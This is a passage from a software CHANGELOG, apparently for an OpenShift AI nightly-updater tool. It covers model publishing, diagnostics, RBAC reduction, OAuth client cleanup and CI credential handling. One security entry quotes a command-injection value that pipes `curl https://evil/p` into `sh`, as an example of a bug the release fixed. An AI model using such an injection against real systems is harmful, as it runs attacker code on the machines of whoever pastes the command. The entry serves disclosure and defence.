  MaaS guard applies. The API takes `keepEnabled` on the plan (query) and
  on both reset requests (required; bound to the reviewed plan's token).
- Helper and error text under a field inside a radio's body (Change
  database's connection URL, custom token rate limits, the groups and users
  of Publish and Change access) sat on the field's edge: the radio group's
  stacked layout pulled it up. It now has PatternFly's spacing, as do the
  fields of Install a different build, whose helper text touched them.
- Change database and Remove MaaS name the database without nested
  parentheses: "...then permanently deletes the current one, the persistent
  development database (CloudNativePG)."
- A model set up on the Models tab **Through MaaS only** is published as
  part of its setup, and its lifecycle now follows that. **Unpublish**
  leaves it with no route (only inside the cluster), as it was set up;
  before, it put the model on KServe's default gateway, which nobody chose,
  and said it routed "as before publishing". **Delete** on the Models tab
  unpublishes it first, in the same operation; before, it refused and
  asked for Unpublish on the MaaS tab. When that unpublish stops, the model
  is not deleted. A model published on the MaaS tab still has to be
  unpublished there first.
- A model with no route of its own goes back to none when it is
  unpublished, in every case: a setup **Through MaaS only** whose publish
  stopped before it recorded anything (its Unpublish put it on KServe's
  default gateway, Delete refused it, and **Set up** again did not publish
  it), and a model set up **Only inside the cluster** and then published
  on the MaaS tab (Publish wrote only the gateway, so KServe made no route
  and the model stayed partly published). Publish now gives such a model
  its route on the MaaS gateway and records that it had none; Unpublish
  again after a route removal that stopped waiting says the model has no
  route. Models' Delete and Set up keep the log lines of the unpublish or
  publish they run.
- A model's image pull through a mirror where one source answers
  "manifest unknown" and another refuses the node's credentials is still
  waited on, but once the wait ends the setup and the Models tab offer
  **Use the newest released Red Hat image** again, worded as a
  possibility ("may not be published").
- A model's image pull that fails is waited on (2 minutes, 8 on a node that
  joined in the last 15 minutes) before the setup fails: live, a new ROSA
  node got its pull credentials a few minutes after it joined.
  A ready wait that ends during a failing image pull keeps the pull
  advice.
- KServe reporting only Connectivity Link missing no longer blocks every
  model: a model reached only inside the cluster does not need it.
- Review of Models and the prerequisites (before release):
  - Taking a project off the inference gateway's list checks, on every
    plan of the write, that no model there uses the gateway (a write
    planned again after a conflict skipped it). **Remove** runs every check
    and the dry run before its write, says when the project is not on the
    list, and refuses when the models, the Gateway or KServe's
    configuration cannot be read. Projects this tool added whose namespace
    was deleted go off the list at the next Models change or Clean up.
  - Clean up turns a component back only with the `resourceVersion` of the
    read its checks were made on, and checks again after a conflict. The
    ownership check notices someone who *changed* the component, not one
    who set it to Managed again; the dialog says the in-use check covers
    that.
  - Only gateways whose token checks the tool can read are recommended
    (in `openshift-ingress`, not `opendatahub.io/managed=false`); others are
    an explicit choice. KServe's default gateway is never assumed when its
    configuration cannot be read or names none.
  - **Can it be called?** also sends the request without a token through a
    gateway: an answer fails the check (**Answers without a token**). A
    model that cannot be called **Needs attention** on its card;
    **Check again** runs in place; results read "Checked 2 minutes ago"
    and no longer repeat themselves; older vLLM's 404 is recognised.
- **Check that the nodes can pull nightly images** no longer says the pull
  secret is missing or the image mirror (IDMS) is not configured when it
  could not read them (403, a server error, the network): it says the read
  failed and why.
- A change whose sign-in ended while it ran (the API server rejected your
  own token mid-change) said "The cluster rejected the updater's
  credentials" and to check the ServiceAccount. It now says "Your sign-in
  ended during the change": part of it may have run; sign in again, check
  the result, then run it again if it is not complete (`sign_in_ended`).
- Update, Install a different build, Refresh and Deploy a dashboard build
  titled a read they could not make before changing anything (the
  installed CSVs, the Subscription, dashboard-operator) "Blocked:
  prerequisites not met" whatever the cause. A denied read now says so
  (`forbidden`), and a sign-in that ended says that; other failures keep
  `prerequisites`.
- Diagnostics no longer reports a module operator's own Deployment as
  "last applied for version ..." (live: the MCP lifecycle operator's
  manager, stamped `platform.opendatahub.io/type=OpenDataHub` and
  `version=0.0.1` by its module framework, on OpenShift AI Self-Managed
  3.6.0). A version is compared only on Deployments whose stamped
  platform type is the installed release's name (the DataScienceCluster's
  `status.release`), as the RHOAI operator stamps it.
- Diagnostics' dead CRD conversion webhook problem named the component
  once per CRD ("here: sparkoperator, sparkoperator, sparkoperator"), and
  its advice (set the component to Managed, delete the objects, set it back
  to Removed) led back to the same state: removing a component leaves its
  CRDs, which get no owner, with the dead webhook (live: Spark's 3 CRDs, no
  objects). Each such CRD is now checked for objects (one list of at most
  one object; a list this app may not make says how to check with `oc`).
  CRDs of a removed component that hold none can be deleted, with the exact
  `oc delete crd ...` command (the operator applies them again when the
  component is set to Managed); for CRDs with objects the advice brings the
  Service back, then deletes the objects and the CRDs before the component
  is set to Removed.
- **`install.sh` checks the manifests it reads against their digests.**
  Since 3.0.2 it reads the revision label from the registry's v2 API and
  checks the config blob's digest. Now each manifest must also
  be the bytes its digest names: the pinned digest for the manifest (list),
  the list's entry for the image manifest. Redirects are followed to
  `https` only (a registry on `localhost`/`127.0.0.1` may also redirect to
  `http` there).

### Security

- **The ServiceAccount is read-mostly.** It keeps the reads every
  signed-in user's pages need, the app's own ConfigMaps, and the background
  MaaS prune job's named writes (delete the tool's MaaSModelRefs, update or
  delete its MaaSSubscription and MaaSAuthPolicy, patch the MaaS gateway and
  its options; the job now only updates existing objects and never
  creates). Gone: every create outside its namespace, every write on
  Secrets, ServiceAccounts, RBAC, namespaces, workloads, Subscriptions,
  CSVs, InstallPlans, CatalogSources, webhooks, CRDs and
  DataScienceClusters (also 4.0.0's own `delete` for the hard reset), so a
  leaked token no longer has cluster-admin reach (130 rules, 123 write verb
  tuples before; about 60 rules after, writes by name only). Tests derive
  the template from the ServiceAccount's own entry points and fail when a
  change could reach its token ([SECURITY.md](SECURITY.md#serviceaccount-rbac)).
  Residual: `get` on four named Secrets and the cluster pull secret, and
  `patch` on `maas-default-gateway` (the prune job).
- **The session cookie now carries a full user token** (encrypted with
  the cookie secret, for up to 23 hours): Secrets `<APP_NAME>-proxy` and
  `<APP_NAME>-oauth-client` are as sensitive as the users' sign-ins; no
  `--cookie-refresh` (broken in openshift/oauth-proxy, and it can log the
  token); the token is never logged, stored or shown
  ([SECURITY.md: Threat model](SECURITY.md#threat-model-of-the-user-token-400)).
- **The OAuthClient does not outlive the install.** The OAuth server
  answers the implicit flow for any client, so with `grantMethod: auto` a
  client left behind would hand a signed-in user's `user:full` token to
  whoever later serves its redirect host (a project admin's Route with the
  freed host); the client secret does not stop that. The client now
  allows exactly the scope `user:full` (`scopeRestrictions`), and is
  deleted with its sign-ins revoked by `install.sh uninstall` (which now
  stops before deleting the namespace when it cannot delete the client), by
  `make rollback` to a 3.x template, and by a new PostDelete hook when the
  chart's Argo CD Application is deleted with its resources (OpenShift
  GitOps 1.14 / Argo CD 2.12 or later). The hooks' RBAC that may create
  OAuthClients or delete access tokens carries `HookFailed`, so a failed
  run no longer leaves it until the next sync.
  **Deleting the namespace by hand leaves the client and its sign-ins**
  (live-checked): run `install.sh uninstall` afterwards (it works once the
  namespace is gone, live-checked), or `oc delete oauthclient
  <APP_NAME>-<NAMESPACE>` and `oc delete oauthaccesstokens --field-selector
  clientName=<APP_NAME>-<NAMESPACE>`
  ([SECURITY.md](SECURITY.md#the-oauthclient-400)). Test builds of 4.0.0
  gave the client an ownerReference to the Namespace; the garbage collector
  did not delete the client with its namespace (live, after more than 3
  minutes), so the client has none, and deploy, upgrade and the chart's
  hook remove one an earlier build left.
- **Revoking a sign-in takes about a minute.** After `oc delete
  oauthaccesstokens --field-selector clientName=...` the API server kept
  accepting the revoked token for about a minute (live; the same for `oc`
  and the dashboard), then the app answered 401 and showed "Your session
  expired" ([SECURITY.md](SECURITY.md#revoking-a-sign-in)). Changes stop at
  once: the session check now refuses a sign-in whose own token object is
  gone, instead of treating it as unreadable and going ahead.
- **One install no longer takes over another's OAuthClient.** Its name
  `<APP_NAME>-<NAMESPACE>` is the same for app `a-b` in namespace `c` and app
  `a` in namespace `b-c`, and the apply forced its fields over. The client
  now carries the app name and namespace as labels; install, upgrade,
  rollback and the chart's hook refuse, before any change, a client of that
  name that is not this install's, and uninstall leaves it and its sign-ins
  alone.
- **Models' copy-paste commands could run what a project editor wrote.**
  The name a model serves (`spec.model.name`), which anyone who can edit
  its project sets on any model of a catalog name, went unquoted into the
  Use it commands' request bodies, so a name such as
  `x"}'; curl https://evil/p|sh; echo '` ran when a cluster-admin pasted
  them. The commands now build every body as JSON and single-quote it
  (names elsewhere are quoted unless plain), and the backend shows, puts
  in commands and calls a model with a served name only when it is
  letters, digits and `. _ / : -`; otherwise Use it shows no commands and
  says why.
- Commit links on the Components page (Deployments) and in a build's
  components (Build Explorer, catalog contents) come from the image's
  labels, which whoever builds the image chooses. They are now links only
  for `https://github.com/<owner>/<repo>`, as elsewhere in the app; before,
  a `javascript:` URL in a label became a clickable link. The backend keeps
  only https repository URLs from labels, and reads labels only for
  images whose reference starts with `registry.redhat.io/rhoai/`,
  `quay.io/rhoai/` or `quay.io/opendatahub/` (it matched those anywhere in
  the reference, and labels are always read from quay.io).
- The update notice's install command checks the download before anything
  runs: `curl ... && echo '<sha256>  install.sh' | sha256sum -c - && less
  install.sh && bash install.sh`. The backend reads the SHA-256 from the
  new release's own notes (the `install.sh SHA-256` line), through the
  GitHub or GitLab releases API, anonymously and cached like the release
  list. Without it, the notice asks you to compare with the release notes.
- The oauth-proxy container runs with a read-only root filesystem, as the
  app container already did (part of template revision 7). oauth-proxy
  writes no files.
- The Content-Security-Policy adds `base-uri 'none'`, `form-action 'self'`,
  `frame-ancestors 'none'` and `object-src 'none'`, which `default-src`
  does not cover.
- S3 storage, **Copy as environment variables**: every value is
  single-quoted (`AWS_SECRET_ACCESS_KEY='...'`), so keys set at a first
  setup with `$`, backticks or spaces cannot run or split when pasted
  into a shell.
- **Log out** now ends the updater's session: it opens oauth-proxy's
  `/oauth/sign_out`, which clears the session cookie. Before, it opened
  the sign-in page and the session stayed. The OpenShift login itself
  stays (SECURITY.md, Sessions): log out of the console to end it.
- **Every authorization check is listed and classified** (SECURITY.md,
  Authorization checks): which checks the API server now makes itself
  with the user's token, which are the app's own policy (the cluster-admin
  gate, the sign-in check, locks, ownership and in-use checks, the
  gen-ai token allowlists) and which gate the ServiceAccount's reads. The
  migration's leftovers are gone: the playground's gen-ai calls use the
  token of the request's client instead of a second, separately chosen
  token (it always was the same one); a 403 answered to your own token no
  longer adds "the updater's ServiceAccount is not allowed ... run `make
  upgrade`", which only applies to the ServiceAccount's reads; unused
  sign-in token fields and RBAC test data for rules the template no
  longer has are removed. The access policy is unchanged and now pinned by
  a test: whoever passes the sign-in gate (`list pods` in
  `redhat-ods-operator`) sees every page read-only, read with the
  ServiceAccount's token; only cluster-admins change things, with their
  own token. Pages read with each user's own token are planned after
  4.0.0.

## [3.0.2] - 2026-11-19

Same template as 3.0.1 (revision 5) and the same app: only `install.sh`
changed.

### Fixed

- `install.sh` no longer refuses a correct image with "reports revision
  \<none\>". The installers from 2.0.0 to 3.0.1 read the image's revision
  label only with `oc image info` on your machine and hid its error, so
  where oc could not read the image (reported on macOS, where the digest
  lookup through the registry worked) they refused the correct v3.0.1
  image. The label is now read from the registry's v2 API first,
  anonymously like the digest: the manifest (for a manifest list, the
  `PLATFORM` image's), then the config blob. A blob redirected to another
  host (Quay's CDN) is fetched without the registry token and must match
  its digest. `oc image info` is the fallback. When both fail, the
  installer stops with "cannot read the revision label" and each reason
  (the registry's HTTP status or curl's error, and oc's error), never a
  token. Resolving the digest and `make rollback`'s tag lookup print their
  reasons the same way. Older installers: see the
  [UPGRADING.md FAQ](docs/UPGRADING.md#7-faq) for how to check the label
  yourself before `ALLOW_TEMPLATE_MISMATCH=1`.

## [3.0.1] - 2026-11-18

### Security

- The updater's ServiceAccount token no longer reaches the Models as a
  Service gateway. The Playground's status and Set up called dashboard
  gen-ai endpoints that pass the caller's token on to the MaaS gateway,
  which the editors of published projects can attach routes to. The tab
  now reads MaaS models from their MaaSModelRefs (only those a
  MaaSSubscription offers), and Set up adds only the project's own models,
  with tracing, guardrails and vector stores off: add a MaaS model in the
  dashboard's playground, signed in as yourself.
- Migrate storage writes the storage's S3 keys only into the projects of
  pipeline servers this tool recorded, or whose project you confirm in the
  dialog. A pipeline server's label was enough before, and a project's
  editors can set it. Pipeline servers set up before 3.0.1 are listed for
  confirmation the first time.
- The MaaS gateway stops admitting projects whose publication is gone (the
  project was deleted, or the model is not the one published): the
  updater checks at start and every 5 minutes (while no other operation
  runs) and at the start of every MaaS, Models or Clean up operation. The
  tool's access policy and subscription stop listing them, and the tool's
  model reference of a remade model is deleted; the MaaS tab names them
  until then, and warns when its record of models cannot be read. A
  deleted project's name could otherwise be recreated by anyone allowed to
  create projects and given routes on the MaaS gateway.
- Errors from writing the node pull secret no longer show the credential
  when the API server quotes what it was sent.
- `GET /api/update-check` now requires a signed-in user, like every other
  API read.
- The MaaS tab's CLI commands quote catalog channel names.
- CI, GitLab: kaniko no longer gets the Quay push credentials
  (`QUAY_USER`/`QUAY_TOKEN`). `build-main` built only a tarball but was
  logged in, and the build's `RUN` steps (`npm ci` install scripts,
  `go mod download`) could read that login. The manual `build-branch` job
  no longer pushes with the release credentials either: it pushes to a
  repository of its own (`BRANCH_IMAGE`, with `QUAY_BRANCH_USER` and
  `QUAY_BRANCH_TOKEN`), or builds only. The release credentials can now be
  protected variables; CONTRIBUTING.md lists the GitLab and Quay settings
  that keep `:main`, `:latest` and the release tags safe.
- CI: `:main` is always the main pipeline's own image. `publish-main` kept
  an existing commit tag whose revision label named the same commit and
  moved `:main` to it, so a workstation build (`make push` pushed the same
  8-character tag, even from a tree with uncommitted changes) could become
  `:main`. It now pushes its own image as `:main`, and stops when the
  commit tag holds anything but its own image or the release image of the
  same commit. `make build` and `make push` use `dev-<commit>` tags
  (`-dirty` with uncommitted changes), `make push` refuses a tree with
  uncommitted changes, and a commit-like `TAG` is not pushed.

### Fixed

- The Playground tab's command for a Models as a Service model names the
  model's subscription (this tool's when the model is offered under it).
  Without one, the dashboard cannot mint the MaaS key it calls the model
  with, and the playground answered 500. The dashboard's own playground
  sends it.
- `dev.sh` stops everything it started on Ctrl-C, kill or a closed
  terminal (also after `kill -9`), and refuses a second copy for the same
  checkout.

### Changed

- Links to the RHOAI dashboard open the matching section page, not a
  project's details page: a project's models open its Deployments page
  (`/ai-hub/models/deployments/internal/<project>`), and MaaS opens MaaS
  governance (`/maas/maas-governance`). Pipelines (`/develop-train/pipelines/definitions/<project>`)
  and the playground (`/gen-ai-studio/playground/<project>`) already did.
- MLflow links open MLflow in the dashboard too: **Open MLflow experiments**
  goes to `/develop-train/mlflow/experiments`, a project's link adds
  `?workspace=<project>`, and a sample's link opens its experiment's runs
  (`/develop-train/mlflow/experiments/<id>/runs`), as the dashboard's own
  links do. Without the dashboard's address they open MLflow's own UI as
  before.
- Release notes (GitLab and GitHub) open with the install and upgrade
  block (download, checksum, dry run, install), then the CHANGELOG
  section; 3.0.0's long section had buried it.
- Internal, CI only: faster pipelines with every check kept. The frontend
  checks run as three parallel jobs (checks, tests, build), the GitLab Go
  and golangci-lint jobs keep their module and build caches, and GitLab's
  image jobs skip the Containerfile's checks (`RUN_CHECKS=false`), which
  the pipeline's test jobs already ran on the same commit. GitLab pulls
  Docker Hub images from `mirror.gcr.io`, Google's public cache of Docker
  Hub, after Docker Hub's anonymous pull limit stopped jobs; the images stay
  pinned by digest. A project variable `DOCKER_HUB` points it elsewhere
  (`docker.io`, or GitLab's Dependency Proxy).

## [3.0.0] - 2026-11-18

### Added

- **MaaS: set it all up from the tab.** Set up now does every step of the
  MaaS install docs that is missing, in their order, after one
  confirmation that lists each change: Red Hat Connectivity Link
  (`redhat-operators`, the channel whose release meets the docs' minimum
  for RHOAI 3.6, read from the catalog, set to deny traffic when rate
  limiting fails as the docs recommend) with its Kuadrant CR, the
  CloudNativePG operator (`certified-operators`, in `cnpg-system`, not
  `openshift-operators`, where an install can pull an OSSM upgrade that
  breaks the gateway), the AI gateway's
  infrastructure namespace, the database, the gateway, Authorino TLS (the
  docs' `setup-authorino-tls.sh`), and `aigateway` with
  `modelsAsAService` in the DataScienceCluster. What exists is used as it
  is; a failed run continues where it stopped. The tab is a checklist:
  each part says what Set up will do, offers its own fix where it has one
  (**Upgrade Connectivity Link**, along OLM's path one channel at a time
  and with Authorino TLS restored afterwards; **Raise the memory limit**,
  only after the Kuadrant operator was OOMKilled; **Deny traffic when
  rate limiting fails**, for a Connectivity Link installed without it;
  **Configure Authorino TLS**; **Remove the old tier policies**), and keeps the commands under
  **Do it from the CLI instead**. Remove keeps the shared pieces
  (Connectivity Link, Kuadrant, Authorino TLS, CloudNativePG), restores
  `aigateway`, and deletes the infrastructure namespace it created only
  when nothing else is in it. New RBAC (template revision 5, SECURITY.md
  "MaaS one-click setup").

- **Pipelines: set up as the RHOAI dashboard sets one up.** The pipeline
  server is named `dspa`, the only name odh-notebook-controller gives
  workbenches a pipeline config for, so Elyra pipelines from a workbench
  work. It carries the dashboard's settings (`managedPipelines`, `mlflow`,
  when the installed CRD declares them), its S3 Secret is owned by it, and a
  dashboard S3 Connection `rhoai-nightly-updater-s3` ("Shared S3 storage
  (RHOAI Nightly Updater)") lets workbenches and model deployments use the
  shared storage. Deleting the server, here or in the dashboard, deletes
  both. A server an earlier version named `nightly-dspa` keeps working; the
  Pipelines tab explains the workbench limitation and offers **Recreate
  with the standard name** (its run history is lost; S3 artifacts stay).
  Setup now refuses a namespace that is not a Data Science project instead
  of creating it, and a server is reported stuck after 5 minutes only while
  its API server is not ready, as the dashboard does. New RBAC: Secret
  `rhoai-nightly-updater-s3` (`get patch delete`).
- **Models and MaaS as the RHOAI 3.6 dashboard makes them.** Each model
  gets the dashboard's token authentication (ServiceAccount `<model>-sa`
  that may only get it, Role, RoleBinding, token Secret
  `default-name-<model>-sa`, all owned by the model), so the dashboard
  lists its token and its Edit keeps authentication on; Use it reads that
  token. A model is the tool's only when its UID is in the tool's record
  (a model a pre-release 3.0.0 build set up is not: delete it with `oc`
  and set it up again). Publishing takes the model out of Gen AI studio's
  AI assets (restored on Unpublish), and the MaaSModelRef is owned by the
  model, with the catalog's name and description. Qwen3's chat template
  JSON has no spaces; models request ephemeral storage for their download;
  setup warns about a full project ResourceQuota; the Models tab says what
  the dashboard shows for a model no hardware profile fits. RBAC:
  ServiceAccounts, Roles, RoleBindings `create` and named `get delete`,
  the token Secrets' names `delete`, ResourceQuotas `list` (SECURITY.md).

- **Models tab: a catalog of four CPU models.** A model picker offers
  SmolLM2 135M Instruct (smoke test), Qwen2.5 0.5B Instruct (the default),
  Qwen3 1.7B (tool calling; thinking off by default) and Granite Embedding
  125M English (768 dimensions), each pinned to a Hugging Face commit, with
  what it is for, what it reserves and its download; a model no worker has
  room for is disabled with the reason. A project can hold several; Set up,
  Delete and Use it act on the chosen one (embeddings get a
  `/v1/embeddings` command, Qwen3 tool-calling and thinking commands; the
  thinking command streams, because the cloud load balancer closes a
  connection that sends nothing for 60 seconds). Memory requests and limits
  come from each model's use measured live on RHOAI 3.6: SmolLM2 4 / 5 GiB,
  Qwen2.5 6 / 8 GiB, Qwen3 12 / 14 GiB, Granite 3 / 4 GiB. The
  storage-initializer skips ONNX and PyTorch files. The Playground adds
  this tool's embedding model as an embedding model (768 dimensions); MaaS
  publishes the chosen chat model (`MaaSRequest.model`). RBAC: the
  LLMInferenceService rule names the four models and the MaaSModelRef rule
  the three chat models (SECURITY.md).

- **Environment page, Playground tab.** One Set up asks the installed RHOAI
  dashboard's own gen-ai API to create its Gen AI playground in a project,
  with the project's ready chat models, as a click in its Gen AI studio does
  (nothing of the playground is copied into this tool); Delete asks it to
  remove it. Only the playground server this tool requested (its recorded UID) is deleted; one made in
  the dashboard, also after deleting this tool's, shows as not managed. Clean up everything deletes the
  playgrounds before the models. The calls use the updater's ServiceAccount
  token; new ClusterRole rules for the dashboard's install and delete are
  audited in SECURITY.md. The Overview gets a Playground row.
- **Environment page, Models tab.** One Set up deploys a small chat model
  (Qwen2.5 0.5B Instruct, vLLM on CPU, LLMInferenceService
  `qwen25-05b-instruct`) in a data science project, and the cluster's
  inference gateway (Gateway `openshift-ingress/openshift-ai-inference`)
  it is reached through, unless one exists; each has its own removal, and
  Clean up everything deletes the models, then the gateway. The CPU preset
  is found at run time; on a nightly cluster that cannot pull the preset's
  image, the newest released Red Hat image is used (`VLLM_CPU_IMAGE`
  overrides it). "Use it" calls the model with the model's own token
  (the dashboard's token authentication, below), never the user's. The
  Overview gets a Models row.
- RBAC (template revision 5): Roles in `openshift-ingress` and
  `openshift-ingress-operator` (new template parameters `INGRESS_NAMESPACE`,
  `INGRESS_OPERATOR_NAMESPACE`) and named ClusterRole rules for the
  GatewayClass, LLMInferenceServices and their presets, KServe's ConfigMap
  `inferenceservice-config` (read, by name) and Gateways (list, read-only);
  each is audited in
  SECURITY.md.

### Changed

- **The S3 admin UI has a password of its own.** It was the S3 secret
  key, which every pipeline project's copy of the keys holds. Setup and
  Repair write a random password into `seaweedfs-s3-credentials` only;
  storage set up earlier asks for Repair, which keeps the S3 keys.

- MLflow set up by this tool uses the MLflow operator's own resource
  defaults (on 3.6: requests 1 CPU / 2 GiB, limits 4 CPU / 3 GiB) instead
  of a 2 GiB limit, which got its 8-worker server OOMKilled while MLflow
  generated demo data.
- **Environment page, for someone new to it.** What a feature needs shows
  before Set up: a DataScienceCluster component that is not Managed (with
  Open Components), no data science project (with a link to the
  dashboard's Projects page), or a namespace `seaweedfs` that is someone
  else's; Set up stays disabled with the reason under it, and every Set
  up first checks all its parts, so it never creates half a feature. The
  backend refuses the same way (the operator keeps a removed component's
  CRD, so a pipeline server or MLflow would be created and never start).
  Set up names what it sets up ("Set up Pipelines in dev-project"), its
  confirmation leads with the outcome ("On the cluster: S3 storage (20
  GiB)... Takes 1 to 3 minutes") with the objects under Details, and every
  change (Set up, Delete, Repair, a PR deploy, Clean up) runs in one
  dialog with its steps and outcome; closed early, a notification brings
  it back. Problems read in words ("The S3 storage's image can't be
  downloaded"), with the fix and View logs on the alert and the pod's
  reasons under Technical details.
- **Clean up.** Each tab, and the Overview ("Clean up everything"),
  deletes what this tool created as one confirmed operation with a
  checkbox per part: the pipeline servers in every project, the S3
  storage (optionally namespace `seaweedfs`), MLflow. It runs on the
  server as one operation (`POST /api/resources/cleanup/stream`, one
  lock and one rate-limit slot) and stops at the first part that fails.
  Per-part Delete and Repair moved from the collapsed Tear down section
  to each part's menu. "Delete" replaces "Tear down" and "Remove".
- **Using what was set up.** Pipelines: where the runs are, the pipeline
  server's API endpoint and a KFP SDK snippet. MLflow: workspaces
  explained, a project picker, Open MLflow in the project's workspace,
  and the client settings (`MLFLOW_TRACKING_URI`,
  `MLFLOW_TRACKING_TOKEN`, `MLFLOW_WORKSPACE`); deploying a PR build
  moved to "Test an MLflow PR build". A "What next" list follows.
- **Sample data and a sample pipeline.** The MLflow tab's Sample data
  adds, per project, MLflow's agent and prompt demo (with Regenerate,
  never Remove), a training experiment with a registered model, an MCP
  server entry and an agent skill, each with its state and where it
  shows in the dashboard; Add all and Remove all are one operation. The
  Pipelines tab's Run a sample pipeline offers a two-step write-and-read
  pipeline as a file, the dashboard's import, and curl commands that
  upload it and start a run with a token of ServiceAccount `pipeline-api`,
  which may only use that pipeline server's API and expires in 15 minutes
  (never your own token): the updater never calls a pipeline server's API,
  so its token never reaches a user's project.
  The Overview and What next point to them once a feature works.
- **Migrate storage** says why at the top of the Pipelines tab, and a
  successful migration ends with its outcome: Delete old storage is a
  separate, later action in the storage's menu.
- Readers see who can help ("ask a cluster-admin") instead of disabled
  changes and key fields. A project deleted elsewhere leaves the picker
  on the next refresh or poll. The Overview's next-step buttons line up
  with the row's text.

- "Open MLflow" uses the address the MLflow operator reports (the MLflow
  CR's `status.url`, on current releases `https://rh-ai.<apps>/mlflow`
  through the data-science gateway). It looked for a Route named `mlflow`,
  which current releases no longer create, so the link was missing; the
  Route is still used on releases whose CR reports no address.
- The update notice's "Release notes" link opens the public GitHub release
  (`.../releases/tag/vX.Y.Z`), the same page the install command downloads
  `install.sh` from. The GitLab release page it linked before redirects
  anyone not signed in to GitLab to the sign-in page.
- **New look: PatternFly 6.7's felt theme**, with an appearance button in
  the masthead (it replaces the moon icon). **Color scheme**: System,
  Light or Dark; **Contrast mode**: System, Default, High contrast or
  Glass (on narrow screens, in the user menu). System follows the
  operating system live: dark mode, "increase contrast" (high contrast)
  and "reduce transparency" (the solid default instead of glass). Glass and high contrast never combine; high contrast
  wins. The choice is kept in the browser; a light or dark choice made
  with the old moon icon carries over. The theme is applied before the
  first paint by a small script file, so the page does not flash, and the
  Content-Security-Policy stays `default-src 'self'` (no inline script).
- **Test resources is now the Environment page**: one-click setups for
  developing and reproducing issues on the cluster. Its address stays
  `/test-resources`, so bookmarks and links keep working. One tab per
  feature after an **Overview**, kept in the address (`?tab=pipelines&project=<name>`,
  `?tab=mlflow`; links to the earlier `?tab=cluster` and `?tab=projects` open
  Pipelines), so links, reloads and back and forward open the same view:
  - **Overview**: "N of M ready" and one row per feature with what it
    gives you, its state and the next step (**Open**, **Set up**, **Show
    issue**). A project-scoped feature summarises its projects ("Ready in
    juntao-test", "Ready in 2 of 5 projects"). The state comes from the
    same function the feature's tab uses, so the two cannot disagree.
  - **Pipelines**: S3 storage (cluster) and the project's pipeline server,
    each with its health, its actions and its details inline: the S3
    endpoint, the bucket and the admin UI login, with the password masked
    behind an eye toggle and a copy button. **Set up** confirms every change
    and then sets up the missing parts in order with their progress. **What
    this creates** is collapsed under the parts; Delete and Repair are in
    each part's menu, and Clean up is at the bottom of the tab. Without
    a project in the address it opens the first project with a ready
    pipeline server.
  - **MLflow**: the MLflow server with Open MLflow, Deploy PR and Revert.
  - Health and ownership are separate: the status is health only (Not set
    up, Setting up, Ready, Needs attention, Error, Deleting, Unknown), and
    something this tool did not create gets a **Not managed by this tool**
    label beside it. It can be Ready and counts as ready; it only gets no
    Delete or Repair. The status also reports the health of pipeline
    servers this tool did not create.
- The admin UI password is read from the server only when you show or copy
  it, instead of an `oc extract` command on the page. Only cluster-admins
  get it; it is never part of the status, never cached and never logged,
  and it is gone when you hide it or leave the tab.
- **Delete** of the S3 storage can also delete namespace `seaweedfs`
  ("Also delete namespace seaweedfs (created by this tool)"): offered only
  when the namespace carries the tool label and the tool wrote it,
  unticked, with what it deletes and what the tool sees there. Needs the
  template's new `delete` on namespace `seaweedfs` (SECURITY.md).
- Pipelines tab: clearing the project picker clears the project (the
  address keeps an empty `project=`), so the picker and the parts show
  the same; reload keeps it, back restores the project.
- Migrate storage's "other keys" refusal names the ways forward by hand.
- New pipeline servers wait until Migrate storage has copied the old
  storage: the copy's check compares both sides, and a server writing to the
  new storage first would make it fail. Migrate storage tells you to run
  Migrate storage again when its setup step stops (it said "re-run setup").
  A failed run shows its reason once, and the removal's "Also delete
  namespace minio" choice sits above the data-loss notice.
- **S3 storage in its own namespace, with SeaweedFS names**: namespace
  `seaweedfs`, Service `seaweedfs-s3` (S3 on 8333, admin UI on 12535),
  Secret `seaweedfs-s3-credentials` with the standard keys
  `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY`, PVC `seaweedfs-data`,
  Route `seaweedfs-admin`. New pipeline servers use
  `seaweedfs-s3.seaweedfs.svc:8333`. SeaweedFS 4.48 → 4.54, pinned by
  digest; its admin UI runs on 12535 with the compatibility listener on
  23646 turned off. `SEAWEEDFS_ACCESS_KEY_ID` and
  `SEAWEEDFS_SECRET_ACCESS_KEY` set the keys of a first setup;
  `MINIO_ROOT_USER`, `MINIO_ROOT_PASSWORD` and `MINIO_IMAGE` are no longer
  read.
- **Migrate storage** moves the storage an earlier version set up in
  namespace `minio` (MinIO, or SeaweedFS behind the MinIO-era names) to
  namespace `seaweedfs`, with its data: it sets up the new storage with new
  keys, copies every bucket and object with an rclone Job and checks
  each byte (any difference stops it), and moves the pipeline servers this
  tool created to the new storage and its keys, waiting until each reaches
  it. Anything else that used the old keys needs the new ones, which the
  Pipelines tab shows. The old
  storage is removed only in a separate, confirmed last step, after a
  checklist for references the tool did not create; deleting namespace
  `minio` (and everything in it) is a separate, unticked choice, offered
  when it carries the tool's label.
  Each run resumes where the last stopped, the removal too: it deletes the
  old server last among what can fail, and once the server is gone a
  re-run finishes without copying again. Until then the S3 storage
  reads **Needs attention**, with a warning at the top of the Pipelines
  tab that offers Migrate storage and the old storage's objects under
  **Storage of an earlier version**, and the in-place MinIO-to-SeaweedFS replacement of 2.x is
  retired. `RCLONE_IMAGE` overrides the pinned rclone 1.76.0 image.
- The appearance popover follows a Contrast mode change: it stayed 8 px
  off its button (glass has a narrower masthead inset) until the next
  status refresh. Its last line names each choice that follows the system
  ("Color scheme follows the system: Dark.").
- Status page, Cluster setup: **Replace token** of the pull secret is a
  button like **Test with Quay** next to it, outlined in red because it
  overwrites a credential that may work, with PatternFly's normal spacing
  between the two (one action group) instead of the wide gap between
  groups. It opens the form, the confirmation step, and hides while the
  form is open; the form ends with **Replace token** (red, enabled once a
  token is pasted) and **Cancel**. Focus moves to the token field, and
  back to **Replace token** on Cancel.
- **Reinstall is now "Install a different build"** (Status → Recovery),
  named by what it does: it uninstalls the operator and installs the build
  you choose, the GA release, any nightly build (older ones too) or a
  custom catalog image; it is also the last resort when Update and
  Re-deploy cannot recover the operator. Its button reads **Choose a
  build...**, the form's choice **Install**, and the confirmation asks you
  to type `install`. Messages, the activity log, help and docs use the new
  name; the API and metrics names stay.
- Rows in cards (Recovery, Environment, Cluster setup) are separated by
  equal space above and below each divider.
- The pull secret form is a standard form: the field is labelled **Auth
  token for quay.io/rhoai**, and where to get the token and where it is
  saved are its helper text.
- The appearance popover's arrow points at the appearance button.
- Action rows use one PatternFly action group each, so related actions get
  the standard spacing: the Environment cards' rows (Open admin UI,
  Migrate storage, Repair, Set up, Open MLflow, Open pipelines) and the
  Status page's installed-build actions.
- The installed-build actions on the Status page are full-size buttons in
  one row: **Choose another build** is a secondary button and **View build
